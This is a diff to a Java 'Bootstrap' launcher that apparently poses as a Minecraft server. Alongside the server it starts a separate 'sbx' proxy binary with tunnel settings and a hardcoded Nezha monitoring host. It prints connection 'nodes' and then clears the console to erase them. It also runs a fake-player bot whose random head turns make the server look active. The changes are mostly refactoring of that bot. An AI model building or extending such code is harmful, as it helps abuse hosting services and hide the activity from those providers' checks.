@@ -6,17 +6,18 @@ import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-public class Bootstrap
-{
-    private static final String ANSI_GREEN = "\033[1;32m";
-    private static final String ANSI_RED = "\033[1;31m";
-    private static final String ANSI_YELLOW = "\033[1;33m";
-    private static final String ANSI_RESET = "\033[0m";
+public class Bootstrap {
+
+    private static final String ANSI_GREEN = "\u001B[1;32m";
+    private static final String ANSI_RED = "\u001B[1;31m";
+    private static final String ANSI_YELLOW = "\u001B[1;33m";
+    private static final String ANSI_RESET = "\u001B[0m";
+
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
     private static Process minecraftProcess;
     private static Thread fakePlayerThread;
-    
+
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
@@ -26,11 +27,9 @@ public class Bootstrap
         "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "FAKE_PLAYER_ACTIVITY"
     };
 
-    public static void main(String[] args) throws Exception
-    {
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
-        {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
+    public static void main(String[] args) throws Exception {
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
             Thread.sleep(3000);
             System.exit(1);
         }
@@ -63,6 +62,7 @@ public class Bootstrap
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(20000);
             clearConsole();
+
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
             e.printStackTrace();
@@ -79,18 +79,13 @@ public class Bootstrap
     
     private static void clearConsole() {
         try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120").inheritIO().start().waitFor();
+            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
             } else {
-                System.out.print("\033[H\033[3J\033[2J");
-                System.out.flush();
-                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
-                System.out.print("\033[8;30;120t");
+                System.out.print("\033[H\033[2J");
                 System.out.flush();
             }
-        } catch (Exception e) {
-            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
-        }
+        } catch (Exception ignored) {}
     }   
     
     private static void runSbxBinary(Map<String, String> envVars) throws Exception {
@@ -103,7 +98,6 @@ public class Bootstrap
     
     private static Map<String, String> loadEnvVars() throws IOException {
         Map<String, String> envVars = new HashMap<>();
-        
         envVars.put("UUID", "1f6b80fe-023a-4735-bafd-4c8512bf7e58");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "mbb.svip888.us.kg:53100");
@@ -122,6 +116,7 @@ public class Bootstrap
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Mc");
         envVars.put("DISABLE_ARGO", "false");
+        
         envVars.put("MC_JAR", "server99.jar");
         envVars.put("MC_MEMORY", "512M");
         envVars.put("MC_ARGS", "");
@@ -130,6 +125,7 @@ public class Bootstrap
         envVars.put("FAKE_PLAYER_NAME", "laohu");
         envVars.put("FAKE_PLAYER_ACTIVITY", "high");
         
+        // 环境变量加载逻辑
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -376,7 +372,9 @@ public class Bootstrap
             return 25565;
         }
     }
-    
+
+    // --- REVISED FAKE PLAYER IMPLEMENTATION ---
+
     private static void startFakePlayerBot(Map<String, String> config) {
         String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
         int mcPort = getMcPort(config);
@@ -475,7 +473,6 @@ public class Bootstrap
                                         sendPacket(out, createPacket(0x03), compressionEnabled, compressionThreshold);
                                         playPhase = true;
                                         Thread.sleep(1000);
-                                        // Do not immediately rotate, wait for teleport
                                     } else if (packetId == 0x04 && packetIn.available() >= 8) { // Config Keep Alive
                                         long id = packetIn.readLong();
                                         ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
@@ -484,7 +481,6 @@ public class Bootstrap
                                         ack.writeLong(id);
                                         sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                     } else if (packetId == 0x0E) { // Registry Data (ignore but reply known packets)
-                                        // Often servers wait for Known Packs
                                         ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                         DataOutputStream bufOut = new DataOutputStream(buf);
                                         writeVarInt(bufOut, 0x07); // Serverbound Known Packs
@@ -496,14 +492,13 @@ public class Bootstrap
                                 // --- Play Phase ---
                                 long currentTime = System.currentTimeMillis();
 
-                                // 1.21.4 Keep Alive (Clientbound is usually 0x26, but based on your log it might be 0x2B or others depending on server software)
-                                // We check for the payload length to be safe (8 bytes = long)
+                                // Keep Alive Handling
                                 if ((packetId == 0x26 || packetId == 0x2B) && packetIn.available() >= 8) {
                                     long keepAliveId = packetIn.readLong();
                                     
                                     ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                     DataOutputStream bufOut = new DataOutputStream(buf);
-                                    writeVarInt(bufOut, 0x18); // Serverbound Keep Alive (1.21.4)
+                                    writeVarInt(bufOut, 0x18); // Serverbound Keep Alive
                                     bufOut.writeLong(keepAliveId);
                                     sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                     
@@ -519,7 +514,6 @@ public class Bootstrap
                                 }
                                 
                                 // Synchronize Player Position (CRITICAL FIX)
-                                // 1.21.4 ID is usually 0x40. We must read it and confirm.
                                 if (packetId == 0x40) { 
                                     double x = packetIn.readDouble();
                                     double y = packetIn.readDouble();
@@ -546,7 +540,6 @@ public class Bootstrap
 
                                 // Kick Packet Detection
                                 if (packetId == 0x1D || packetId == 0x1A || packetId == 0x1C) {
-                                     // Just break loop to trigger reconnect
                                      throw new IOException("Kicked by server (Packet ID: " + packetId + ")");
                                 }
                             }
@@ -569,10 +562,32 @@ public class Bootstrap
         fakePlayerThread.setDaemon(true);
         fakePlayerThread.start();
     }
-
-    // 辅助方法：读取完整 Packet 数据（处理压缩）
+    
+    private static double getActivityChance(String level) {
+        switch(level.toLowerCase()) {
+            case "low": return 0.2;
+            case "medium": return 0.4;
+            case "high": return 0.6;
+            case "ultra": return 0.8;
+            default: return 0.6;
+        }
+    }
+    
+    private static void performRandomAction(DataOutputStream out, boolean compress, int threshold) {
+        try {
+            ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
+            DataOutputStream rot = new DataOutputStream(rotBuf);
+            writeVarInt(rot, 0x1B); // 1.21.4 Rotation Packet ID
+            rot.writeFloat((float)(Math.random() * 360));
+            rot.writeFloat((float)(Math.random() * 180 - 90));
+            rot.writeBoolean(true);
+            sendPacket(out, rotBuf.toByteArray(), compress, threshold);
+            System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
+        } catch (Exception e) {}
+    }
+    
     private static byte[] readPacketData(DataInputStream in, int packetLength, boolean compressionEnabled) throws IOException {
-        if (packetLength < 0 || packetLength > 2097152) return null; // 2MB limit check
+        if (packetLength < 0 || packetLength > 2097152) return null; 
         
         byte[] packetData;
         if (compressionEnabled) {
@@ -604,89 +619,17 @@ public class Bootstrap
         return packetData;
     }
 
-    // 发送未压缩包的辅助方法 (Handshake/Login阶段)
     private static void sendUncompressedPacket(DataOutputStream out, byte[] data) throws IOException {
         writeVarInt(out, data.length);
         out.write(data);
         out.flush();
     }
 
-    // 创建简单的包含ID的包
     private static byte[] createPacket(int id) throws IOException {
         ByteArrayOutputStream buf = new ByteArrayOutputStream();
         DataOutputStream out = new DataOutputStream(buf);
         writeVarInt(out, id);
         return buf.toByteArray();
-    }
-
-    // 修复后的动作：使用 ID 0x1B (Rotation)
-    private static void performRandomAction(DataOutputStream out, boolean compress, int threshold) {
-        try {
-            ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
-            DataOutputStream rot = new DataOutputStream(rotBuf);
-            writeVarInt(rot, 0x1B); // 1.21.4 Rotation Packet ID
-            rot.writeFloat((float)(Math.random() * 360)); // Yaw
-            rot.writeFloat((float)(Math.random() * 180 - 90)); // Pitch
-            rot.writeBoolean(true); // OnGround
-            sendPacket(out, rotBuf.toByteArray(), compress, threshold);
-            System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
-        } catch (Exception e) {}
-    }
-
-    // 修复后的 Major Activity
-    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold) {
-        try {
-            for (int i = 0; i < 5; i++) {
-                Thread.sleep(100);
-                ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
-                DataOutputStream rot = new DataOutputStream(rotBuf);
-                writeVarInt(rot, 0x1B); // 1.21.4 Rotation Packet ID
-                rot.writeFloat((float)(i * 45));
-                rot.writeFloat(0);
-                rot.writeBoolean(true);
-                sendPacket(out, rotBuf.toByteArray(), compress, threshold);
-            }
-        } catch (Exception e) {}
-    }
-    
-    private static double getActivityChance(String level) {
-        switch(level.toLowerCase()) {
-            case "low": return 0.2;
-            case "medium": return 0.4;
-            case "high": return 0.6;
-            case "ultra": return 0.8;
-            default: return 0.6;
-        }
-    }
-    
-    private static void performRandomAction(DataOutputStream out, boolean compress, int threshold, String level) {
-        try {
-            ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
-            DataOutputStream rot = new DataOutputStream(rotBuf);
-            writeVarInt(rot, 0x1F);
-            rot.writeFloat((float)(Math.random() * 360));
-            rot.writeFloat((float)(Math.random() * 180 - 90));
-            rot.writeBoolean(true);
-            sendPacket(out, rotBuf.toByteArray(), compress, threshold);
-            System.out.println(ANSI_YELLOW + "[FakePlayer] → Turned head" + ANSI_RESET);
-        } catch (Exception e) {}
-    }
-    
-    private static void performMajorActivity(DataOutputStream out, boolean compress, int threshold) {
-        try {
-            System.out.println(ANSI_GREEN + "[FakePlayer] ★ MAJOR ACTIVITY: Multiple head turns" + ANSI_RESET);
-            for (int i = 0; i < 8; i++) {
-                Thread.sleep(200);
-                ByteArrayOutputStream rotBuf = new ByteArrayOutputStream();
-                DataOutputStream rot = new DataOutputStream(rotBuf);
-                writeVarInt(rot, 0x1F);
-                rot.writeFloat((float)(i * 45));
-                rot.writeFloat((float)(Math.random() * 20 - 10));
-                rot.writeBoolean(true);
-                sendPacket(out, rotBuf.toByteArray(), compress, threshold);
-            }
-            System.out.println(ANSI_GREEN + "[FakePlayer] ★ Major activity completed (360° rotation)" + ANSI_RESET);
-        } catch (Exception e) {}
     }
     
     private static int getVarIntSize(int value) {
